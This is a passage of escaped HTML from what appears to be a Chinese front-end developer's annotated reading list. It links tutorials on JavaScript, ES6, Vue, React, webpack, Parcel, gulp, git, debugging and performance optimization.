href=\"http://www.cnblogs.com/wangfupeng1988/p/4001284.html\"\u003e深入理解javascript原型和闭包系列\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000000652749\"\u003eJavaScript学习总结（一）基础部分\u003c/a\u003e（这个系列的文章不错，不要忘记看完这个系列不过大家得在发文章的专栏找下这个系列的文章，因为作者在这个专栏发文不是连着发一个系列，中间也夹杂着其它文章，不过也很好找。在这专栏（\u003ca href=\"https://segmentfault.com/blog/trigkit4\"\u003etrigkit4\u003c/a\u003e）里面，即使不是这个系列的文章，我看过其中几篇，感觉也很好，大家可以留意下）\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000003932488\"\u003eJavaScript设计模式与开发实践 | 01 - 面向对象的JavaScript\u003c/a\u003e（这个系列的教程不错，《JavaScript设计模式与开发实践》的笔记，这本书我也看过，这本书不错，作者整理总结得也不错，大家看完，收获不少）\u003cbr\u003e\u003ca href=\"https://www.zhihu.com/question/54637225/answer/140362071?utm_source=qq\u0026amp;utm_medium=social\"\u003eJavaScript 函数式编程存在性能问题么？\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://mp.weixin.qq.com/s/5dAjzaTgbhZUpZ6w-juU8Q\"\u003e如何让 JS 写得更漂亮\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://juejin.im/post/5976b1ef5188250c980304c9\"\u003eJS的平凡之路--学习人气眼中的效果（上）\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://shimo.im/doc/VXqv2bxTlOUiJJqO/\"\u003e你还在用for循环大法麽？\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000006990480\"\u003e前端模板的原理与实现\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://blog.jobbole.com/56689/\"\u003e只有20行Javascript代码！手把手教你写一个页面模板引擎\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000010744960\"\u003e【教学向】150行代码教你实现一个低配版的MVVM库（1）- 原理篇\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000010752076\"\u003e【教学向】150行代码教你实现一个低配版的MVVM库（2）- 代码篇\u003c/a\u003e（可以关注这篇文章对应的专栏，写得不错，不知道作者还会不会写下一篇）\u003cbr\u003e\u003ca href=\"https://www.zhihu.com/question/19713563\"\u003e如何循序渐进、有效地学习JavaScript？\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.cnblogs.com/moqing/p/5665126.html\"\u003e过目不忘JS正则表达式\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000010456158\"\u003eJavaScript 进阶之深入理解数据双向绑定\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000004847657\"\u003e利用 JavaScript 数据绑定实现一个简单的 MVVM 库\u003c/a\u003e（这篇文章除了自己简单造轮子，更重要的是用一个实例了解MVVM的原理）\u003cbr\u003e\u003ca href=\"https://deerchao.net/tutorials/regex/regex.htm\"\u003e正则表达式30分钟入门教程\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://hijiangtao.github.io/2017/08/03/How-to-Manipulate-DOM-Effectively/\"\u003e如何监听页面 DOM 变动并高效响应\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.ruanyifeng.com/blog/2016/11/intersectionobserver_api.html\"\u003eIntersectionObserver API 使用教程\u003c/a\u003e（利用这个API可以更简单的实现图片懒加载和其它事情，性能也更高）\u003cbr\u003e（下面三个连接，是知乎上的几个话题，里面的回答质量参差不齐，大家可以挑些高质量的回答看，绝对有帮助）\u003cbr\u003e\u003ca href=\"https://www.zhihu.com/question/27471576/answer/211014066\"\u003e作为一名前端开发人员，有哪些值得一读的js代码？\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://www.zhihu.com/question/27428135\"\u003eJavaScript 有什么奇技淫巧？\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://www.zhihu.com/question/38269966\"\u003e用 JavaScript 可以做哪些有趣的事情？\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://litten.me/2017/07/09/prevent-spiders/\"\u003e反击爬虫，前端工程师的脑洞可以有多大？\u003c/a\u003e（前端反爬虫的文章，只有想不到，没有做不到）\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/p/28937831?group_id=886555115845218304\"\u003e这些的JavaScript编程黑科技，装逼指南，高逼格代码，让你惊叹不已\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://www.h5jun.com/post/how-to-write-better-js-code.html\"\u003e如何写出好的 JavaScript —— 浅谈 API 设计\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://juejin.im/post/58ff6374570c350058f489b5\"\u003eJavaScript 设计模式 ① 正确使用面向对象编程的姿势\u003c/a\u003e（看了第一篇，不要忘记下面的）\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/p/28910636\"\u003e如何优雅的编写 JavaScript 代码\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000011031658\"\u003e个人小结--javascript实用技巧和写法建议\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://www.h5jun.com/post/sixty-lines-of-code-animation.html#toc-ea4\"\u003e用65行代码实现JavaScript动画序列播放\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://www.h5jun.com/post/handlock-comp.html#toc-471\"\u003e如何用原生 JS 实现手势解锁组件\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000011151972\"\u003eJavascript思维导图\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://refined-x.com/2017/09/06/%E7%BA%AF%E5%89%8D%E7%AB%AF%E5%AE%9E%E7%8E%B0%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB-%E6%8F%90%E5%8F%96-%E5%90%88%E6%88%90/\"\u003e纯前端实现人脸识别-提取-合成\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.lovebxm.com/2017/05/31/RegExp/\"\u003e最全正则表达式总结：验证QQ号、手机号、Email、中文、邮编、身份证、IP地址等\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://mp.weixin.qq.com/s?__biz=MzI3NzIzMzg3Mw==\u0026amp;mid=100000054\u0026amp;idx=1\u0026amp;sn=71f6c214f3833d9ca20b9f7dcd9d33e4\"\u003e99%的人都理解错了HTTP中GET与POST的区别\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.lixuejiang.me/2016/11/01/JavaScript%E7%9A%84%E7%BB%83%E4%B9%A0%E7%BD%91%E7%AB%99%E6%94%B6%E9%9B%86/\"\u003eJavaScript练习网站收集\u003c/a\u003e（收录一些js练习的网站，有空可以去练习一下）\u003cbr\u003e\u003ca href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/A_re-introduction_to_JavaScript\"\u003e重新介绍 JavaScript（JS 教程）\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://juejin.im/post/5a2a7a5051882535cd4abfce\"\u003e编写自己的代码库（javascript常用实例的实现与封装）\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://juejin.im/post/5a0c170c6fb9a0451c39eff2\"\u003e让我印象深刻的javascript面试题\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://juejin.im/post/5a39b2dcf265da431d3cd036\"\u003eJavaScript 打怪升级 —— 把业务逻辑当练习题做\u003c/a\u003e\u003c/p\u003e\u003ch3\u003ejavascript(es6，es7，es8)\u003c/h3\u003e\u003cp\u003e\u003ca href=\"http://es6.ruanyifeng.com/\"\u003e阮一峰 es6\u003c/a\u003e（可以当作es6文档用的在线书籍）\u003cbr\u003e\u003ca href=\"http://taobaofed.org/blog/2016/07/22/es6-basics/\"\u003eES6 你可能不知道的事 - 基础篇\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://taobaofed.org/blog/2016/11/03/es6-advanced/\"\u003eES6 你可能不知道的事 - 进阶篇\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.jianshu.com/p/ebfeb687eb70\"\u003e30分钟掌握ES6/ES2015核心内容\u003c/a\u003e（简单粗暴介绍es6核心）\u003cbr\u003e\u003ca href=\"https://juejin.im/post/597724c26fb9a06bb75260e8\"\u003e八段代码彻底掌握 Promise\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://mp.weixin.qq.com/s?__biz=MjM5MTA1MjAxMQ==\u0026amp;mid=2651226733\u0026amp;idx=1\u0026amp;sn=3723daf1d45a67be76be4358eca92c40\u0026amp;chksm=bd495be98a3ed2ff8b7d630a646fab13cca6f6bafacd650f2188b41432d35ab430efa1e19d3e\u0026amp;mpshare=1\u0026amp;scene=23\u0026amp;srcid=07266sd1A9P62rw0hBVxOcer#rd\"\u003eECMAScript 6 新特性\u003c/a\u003e（总结性描写常用的es6新特性）\u003cbr\u003e\u003ca href=\"https://juejin.im/post/5a08e5c55188252abc5dd96f\"\u003e实例感受-es6的常用语法和优越性\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000010907053\"\u003e10个最佳ES6特性\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000011017894#articleHeader8\"\u003e聊聊ES7与ES8特性\u003c/a\u003e\u003ca href=\"https://blog.fundebug.com/2017/04/04/nodejs-async-await/\"\u003eAsync/Await替代Promise的6个理由\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.cnblogs.com/zhuanzhuanfe/p/7493433.html\"\u003e10分钟学会ES7+ES8\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://juejin.im/post/5a2e5f0851882575d42f5609\"\u003eimport、require、export、module.exports 混合使用详解\u003c/a\u003e\u003c/p\u003e\u003ch3\u003etypeScript\u003c/h3\u003e\u003cp\u003e\u003ca href=\"https://www.tslang.cn/docs/home.html\"\u003e官网文档\u003c/a\u003e（ts的一个官方文档，写得较好）\u003c/p\u003e\u003ch3\u003ejquery\u003c/h3\u003e\u003cp\u003e\u003ca href=\"http://www.cnblogs.com/aaronjs/p/3279314.html\"\u003ejquery源码分析\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.cnblogs.com/zhuzhenwei918/p/6181760.html\"\u003ejQuery中的100个技巧（译）\u003c/a\u003e（看了这篇文章，感觉自己学的是假jquery，不过很多技巧我没有亲身试过，保留意见）\u003cbr\u003e\u003ca href=\"http://www.42du.cn/p/16\"\u003e这几条JQuery提升性能的规则你需要牢记\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000009679758\"\u003eJQuery坑，说说哪些大家都踩过的坑\u003c/a\u003e（对于刚接触的新人而言，这篇文章还有帮助）\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000010063989\"\u003ejQuery学习笔记\u003c/a\u003e（总结性说明jquery常用的api，也不错）\u003cbr\u003e\u003ca href=\"http://www.cnblogs.com/jesse131/p/5494590.html\"\u003ejQuery插件开发总结\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/p/29020657\"\u003ejQuery === 面条式代码？\u003c/a\u003e\u003c/p\u003e\u003ch3\u003evue\u003c/h3\u003e\u003cp\u003e\u003ca href=\"https://cn.vuejs.org/v2/guide/\"\u003evue官网\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000008279436\"\u003eVue2.x踩坑与总结\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://www.v2ex.com/t/325312#reply1\"\u003eVue 中你不知道但却很实用的黑科技\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://aotu.io/notes/2016/12/28/vue-clock/\"\u003e一个栗子实践vue2.0与1.0的区别\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.jianshu.com/p/b544091c3d67\"\u003e我从未见过如此简洁易懂的Vue教程\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://vuejs-tips.github.io/cheatsheet/\"\u003evue-API\u003c/a\u003e（2.3版本的API大全）\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/p/26057542?utm_medium=social\u0026amp;utm_source=qq?utm_medium=social\u0026amp;utm_source=qq\"\u003eVue.js 插件开发详解\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000010813937\"\u003evue插件编写与实战\u003c/a\u003e（从开发到发布的一个流程，实例简单易懂）\u003cbr\u003e\u003ca href=\"http://www.tuicool.com/articles/vmaiei2\"\u003e使用 Vue.js 创建的 Calendar\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/p/26535530?utm_medium=social\u0026amp;utm_source=qq?utm_medium=social\u0026amp;utm_source=qq\"\u003e加薪DAY10」Vue开源项目库汇总\u003c/a\u003e（杂七杂八的库都有，质量当然也是有高有低，大家挑着看。）\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/p/25589193\"\u003eVue.js 的实用技巧（一）(看了第一篇，别忘记剩下的)\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://github.com/zoro-web/blog/issues/2\"\u003e深入vue2.0底层思想--模板渲染\u003c/a\u003e \u003cbr\u003e\u003ca href=\"http://www.cnblogs.com/keepfool/p/5690366.html\"\u003eVue.js——vue-router 60分钟快速入门\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://hcysun.me/2017/03/03/Vue%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/\"\u003eVue2.1.7源码学习\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://github.com/DMQ/mvvm\"\u003e剖析Vue实现原理 - 如何实现双向绑定mvvm\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000009397476\"\u003eVue.js入门（一）--MVVM框架理解\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==\u0026amp;mid=2651552436\u0026amp;idx=2\u0026amp;sn=837a93a7d364da7623de005d55b44c16\u0026amp;chksm=8025ad75b7522463f5cd3b03856602b999cdf9dbb19afd501dd0e93acdd526da7f67b085d5a7\u0026amp;mpshare=1\u0026amp;scene=23\u0026amp;srcid=0807Itvw3TvEVYwhGzIpxd34#rd\"\u003eVue2 源码分析——逻辑梳理\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000010559711\"\u003e手把手教你撸个vue2.0弹窗组件\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000011153487\"\u003e深入浅出基于“依赖收集”的响应式原理\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://refined-x.com/2017/06/13/Vue%E5%85%A8%E5%AE%B6%E6%A1%B6%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/\"\u003eVue全家桶实践项目总结\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000005018970\"\u003evuex入门实例(1/3)\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://mp.weixin.qq.com/s/sLAUSzP8GrQHELVULLpD_g\"\u003e原创《vue2.0进阶系列》教程目录大全\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000012083511\"\u003e另辟蹊径：vue单页面，多路由，前进刷新，后退不刷新\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://vuejsexamples.com/\"\u003evuejsexamples\u003c/a\u003e（vue的各种demo，可能会有需要的需求）\u003cbr\u003e\u003ca href=\"https://juejin.im/post/5a0c191f6fb9a04514639419\"\u003evue快速入门的三个小实例\u003c/a\u003e（我自己的文章，比较基础的用法，用三个小实例讲解vue的入门，）\u003cbr\u003e\u003ca href=\"https://juejin.im/post/5a3b02026fb9a0451a7689fd\"\u003e用vue开发一个所谓的数独\u003c/a\u003e\u003c/p\u003e\u003ch3\u003ewebpack\u003c/h3\u003e\u003cp\u003e（下面的文章，有些是webpack1.x和2.x的，考虑到现在已经更新到3.x了，大家看时候要注意区别）\u003cbr\u003e\u003ca href=\"https://doc.webpack-china.org/\"\u003ewebpack中文网\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://webpackdoc.com/\"\u003ewebpack官方文档\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://github.com/lcxfs1991/blog/issues/2\"\u003ewebpack使用优化（基本篇）\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.tuicool.com/articles/vAbYruq\"\u003ewebpack常用功能介绍\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://juejin.im/post/5a1fb39451882510b275294d\"\u003ewebpack 3 零基础入门教程 #1 - 介绍\u003c/a\u003e（看了第一篇，不要忘记下面的，这个系列值得一看）\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000005770042\"\u003e开发工具心得：如何 10 倍提高你的 Webpack 构建效率\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/p/26710831\"\u003eWebpack 大法之 Code Splitting\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000006843916\"\u003ewebpack多页应用架构系列（一）：一步一步解决架构痛点\u003c/a\u003e（看了第一篇不要忘记剩下的，这个系列的文章不错）\u003cbr\u003e\u003c/p\u003e\u003ch3\u003eparcel\u003c/h3\u003e\u003cp\u003e\u003ca href=\"https://segmentfault.com/a/1190000012332187\"\u003e宣布 Parcel：一个快速，零配置的 Web 应用打包工具\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://github.com/Mcbai/Blog/issues/2\"\u003e前端构建工具吐槽与parcel极简入门\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://juejin.im/entry/5a391fdf6fb9a04515440339?utm_medium=fe\u0026amp;utm_source=weixinqun\"\u003e折腾记：Hello Parcel\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://juejin.im/post/5a38e100f265da4324809297\"\u003e从 webpack 到全面拥抱 Parcel #1 探索 Parcel\u003c/a\u003e（这篇应该会用后续内容，大家可以跟着学）\u003c/p\u003e\u003ch3\u003egulp\u003c/h3\u003e\u003cp\u003e\u003ca href=\"http://www.ydcss.com/archives/18\"\u003egulp详细入门教程\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.cnblogs.com/2050/p/4198792.html\"\u003e前端构建工具gulp的使用介绍及技巧\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.gulpjs.com.cn/docs/getting-started/\"\u003egulp入门指南\u003c/a\u003e\u003c/p\u003e\u003ch3\u003ereact\u003c/h3\u003e\u003cp\u003e（react我刚接触不久，暂时看过的网站就这两个）\u003cbr\u003e\u003ca href=\"http://www.react-cn.com/\"\u003eReact中国\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.ruanyifeng.com/blog/2016/09/react-technology-stack.html\"\u003eReact 技术栈系列教程\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000010832044\"\u003eReact组件规范\u003c/a\u003e\u003ca href=\"https://github.com/iuap-design/blog/issues/178\"\u003e在\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://github.com/iuap-design/blog/issues/179\"\u003e在 2017 年学习 React + Redux 的一些建议（中篇）\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://github.com/iuap-design/blog/issues/180\"\u003e在 2017 年学习 React + Redux 的一些建议（下篇）\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://juejin.im/post/599156cc6fb9a03c3a25db08\"\u003e学习 React.js 比你想象的要简单\u003c/a\u003e\u003cbr\u003e\u003c/p\u003e\u003ch3\u003egit\u003c/h3\u003e\u003cp\u003e\u003ca href=\"http://backlogtool.com/git-guide/cn/\"\u003e猴子都能懂的GIT入门\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000\"\u003eGit教程 - 廖雪峰的官方网站\u003c/a\u003e\u003c/p\u003e\u003ch3\u003ebrowsersync\u003c/h3\u003e\u003cp\u003e\u003ca href=\"http://www.browsersync.cn/#install\"\u003e(Browsersync中文网 - 省时的浏览器同步测试工具)\u003c/a\u003e\u003c/p\u003e\u003ch3\u003enode.js\u003c/h3\u003e\u003cp\u003e\u003ca href=\"https://nodesource.com/blog/an-absolute-beginners-guide-to-using-npm\"\u003e使用npm - NodeSource的绝对入门指南\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://nodesource.com/blog/the-basics-of-package-json-in-node-js-and-npm?utm_source=nodeweekly\u0026amp;utm_medium=email\"\u003eNode.js和npm - NodeSource中的Package.json的基础知识\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://nodesource.com/blog/configuring-your-npmrc-for-an-optimal-node-js-environment\"\u003e配置.npmrc以获取最佳Node.js环境\u003c/a\u003e\u003c/p\u003e\u003ch3\u003eMarkdown\u003c/h3\u003e\u003cp\u003e\u003ca href=\"https://sspai.com/post/25137\"\u003e认识与入门 Markdown\u003c/a\u003e\u003c/p\u003e\u003ch3\u003eyoeman\u003c/h3\u003e\u003cp\u003e\u003ca href=\"http://www.tuicool.com/articles/FBRvIbQ\"\u003e教你从零开始搭建一款前端脚手架工具\u003c/a\u003e\u003c/p\u003e\u003ch3\u003elodash\u003c/h3\u003e\u003cp\u003e\u003ca href=\"http://lodashjs.com/\"\u003e这是一个具有一致接口、模块化、高性能等特性的 JavaScript 工具库。\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://lodash.com/docs/4.17.4#chunk\"\u003e4.17.4版本\u003c/a\u003e\u003c/p\u003e\u003ch3\u003eFiddler\u003c/h3\u003e\u003cp\u003e\u003ca href=\"http://www.telerik.com/fiddler\"\u003e官网\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://kb.cnblogs.com/page/130367/\"\u003eFiddler教程\u003c/a\u003e\u003c/p\u003e\u003ch3\u003e调试\u003c/h3\u003e\u003cp\u003e\u003ca href=\"https://juejin.im/post/59ffad656fb9a0450b65c4c0\"\u003eweb调试优化-chrome开发者工具不完全指南\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/p/23162358\"\u003e分享几个日常调试方法让js调试更简单\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/p/24770877\"\u003e用 Chrome 调试你的 JavaScript\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/p/23080626\"\u003eJavaScript 中 console 的用法\u003c/a\u003e（看了这篇和上面一篇文章，你可能会感觉以前根本不会使用console）\u003cbr\u003e\u003ca href=\"http://www.cnblogs.com/constantince/category/712675.html\"\u003eChrome开发者工具系列\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000011213814\"\u003eWeb 的现状：网页性能提升指南\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://juejin.im/post/59c4c9d85188254f58412d17\"\u003e移动 Web 开发问题和优化小结\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://juejin.im/entry/58947598128fe1006ca2b85d\"\u003e前端优化不完全指南\u003c/a\u003e\u003cbr\u003e\u003c/p\u003e\u003ch3\u003e细节，优化\u003c/h3\u003e\u003cp\u003e\u003ca href=\"http://www.cnblogs.com/yexiaochai/p/4219523.html\"\u003e浅谈移动前端的最佳实践\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.cnblogs.com/yexiaochai/p/4901341.html\"\u003e前端优化带来的思考，浅谈前端工程化\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://aotu.io/notes/2016/04/12/jcloud-opt/\"\u003e前端优化实践总结\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/p/24495650\"\u003e减少前端代码耦合\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.daqianduan.com/6419.html\"\u003e判断单、多张图片加载完成\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/p/28091618\"\u003e终端代码重复率检测\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.cnblogs.com/yexiaochai/p/4876099.html\"\u003e【组件化开发】前端进阶篇之如何编写可维护可升级的代码\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.cnblogs.com/virtual/p/3735249.html\"\u003e作为一个web开发人员，哪些技术细节是在发布站点前你需要考虑到的\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.cnblogs.com/yexiaochai/p/3589837.html\"\u003e【单页应用】我们该如何处理框架弹出层层级关系？\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.alloyteam.com/2012/05/pick-up-templates-speed-up/\"\u003e剥离模板代码加速Web页面加载\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://tgideas.qq.com/webplat/info/news_version3/804/808/811/m579/201412/293834.shtml\"\u003e移动前端系列——移动页面性能优化\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000005882953\"\u003e[聊一聊系列]聊一聊百度移动端首页前端速度那些事儿\u003c/a\u003e\u003c/p\u003e\u003ch3\u003e其它\u003c/h3\u003e\u003cp\u003e\u003ca href=\"http://www.cnblogs.com/lxxhome/p/5980615.html\"\u003esocket.io 中文手册 socket.io 中文文档\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/p/23467317\"\u003eWebSocket 与 Socket.IO\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/p/26907805\"\u003eVR进化论|教你搭建通用的WebVR工程\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/mtdpdiancan\"\u003eRxJS 入门\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/write?draftId=1220000010354318\"\u003edeeplearn.js：浏览器端机器智能框架\u003c/a\u003e\u003c/p\u003e\u003ch3\u003e分享和技能清单\u003c/h3\u003e\u003cp\u003e\u003ca href=\"http://www.jianshu.com/p/b7f8c5564e78\"\u003e鸡年大吉！继续前行的前端周刊（第十五期）\u003c/a\u003e（虽然差不多狗年了，但是里面的内容并没有过时）\u003cbr\u003e\u003ca href=\"http://collect.w3ctrain.com/\"\u003e前端收藏夹\u003c/a\u003e（和上面那篇一样，都是别人的总结的，干货不少，但是‘前端收藏夹’，可能是资源太多了，给我的感觉也有点一股脑放资源的感觉，只要是资源，都放进去，少部分资源质量有点低，建议大家带参考思想看）\u003cbr\u003e\u003ca href=\"https://github.com/hoosin/mobile-web-favorites\"\u003e移动web干货收藏夹\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://www.awesomes.cn/\"\u003eawesomes\u003c/a\u003e（前端一个巨大的资源库，里面的资源应有尽有）\u003cbr\u003e\u003ca href=\"http://lib.csdn.net/\"\u003e知识库\u003c/a\u003e（拥有很多语言，框架，库的知识图谱，值得一看！能让你了解哪个语言，框架，库所包含的知识点，每一个知识点的详情讲解，也有栗子和文章，如：\u003ca href=\"http://lib.csdn.net/base/javascript/structure\"\u003ejavascript知识图谱\u003c/a\u003e，\u003ca href=\"http://lib.csdn.net/base/html5/structure\"\u003ehtml5知识图谱\u003c/a\u003e，\u003ca href=\"http://lib.csdn.net/base/react/structure\"\u003ereact知识图谱\u003c/a\u003e）\u003cbr\u003e\u003ca href=\"https://github.com/hacke2/hacke2.github.io/issues\"\u003e前端资源分享\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/p/22229868\"\u003e送给前端的你，推荐几篇前端汇总文章。 - 知乎专栏\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://github.com/darcyclarke/Front-end-Developer-Interview-Questions\"\u003e前端面试问题合集（Front-end-Developer-Interview-Questions）\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000002804472\"\u003egithub上值得关注的前端项目\u003c/a\u003e（trigkit4大神审理的一份清单，里面推荐的项目很多，大家可以按需所需）\u003cbr\u003e\u003ca href=\"http://book.douban.com/doulist/13701898/\"\u003e前端那点事儿（书列）\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000010791103\"\u003eFPB 2.0：免费的计算机编程类中文书籍 2.0\u003c/a\u003e（迷渡大神分享的书籍，各类图书都有，也有前端的，大家可以挑着看）\u003cbr\u003e\u003ca href=\"https://www.qcloud.com/community/article/690930001489391663?fromSource=gwzcw.58366.58366.58366\"\u003e腾讯 Web 工程师的前端书单\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://dwqs.gitbooks.io/frontenddevhandbook/content/\"\u003e前端开发者手册\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://www.docschina.org/\"\u003e印记中文-手册\u003c/a\u003e（各种开发文档，webpack,vue,sass等）\u003cbr\u003e（以下几个链接，不是文章，也不算问题吧，都是segmentfault官方举行的比赛，分享或者讨论的内容，在上面看大神的分享，代码，绝对有收获）\u003cbr\u003e\u003ca href=\"https://segmentfault.com/q/1010000000750825\"\u003e1024 HackGame 第四关面壁人这些题目是怎么想出来的？\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/q/1010000000689388\"\u003e把 SegmentFault 全部带回家 —— 码文章，送周边\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/q/1010000000485947\"\u003e官方送书活动第二弹 —— 增长姿势之SF喊你来谈开发\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/q/1010000000351723\"\u003e官方活动，深入浅出之SF喊你来谈开发！一起来分享一下你的开发知识？\u003c/a\u003e\u003cbr\u003e\u003ca 